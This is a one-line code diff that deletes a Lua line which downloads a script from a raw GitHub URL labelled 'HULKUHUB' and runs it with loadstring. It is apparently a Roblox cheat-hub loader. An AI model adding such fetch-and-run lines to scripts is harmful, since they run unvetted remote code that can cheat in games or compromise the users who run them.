@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/HULKUexe/exe.bf--17.3/main/HULKUHUB"))()
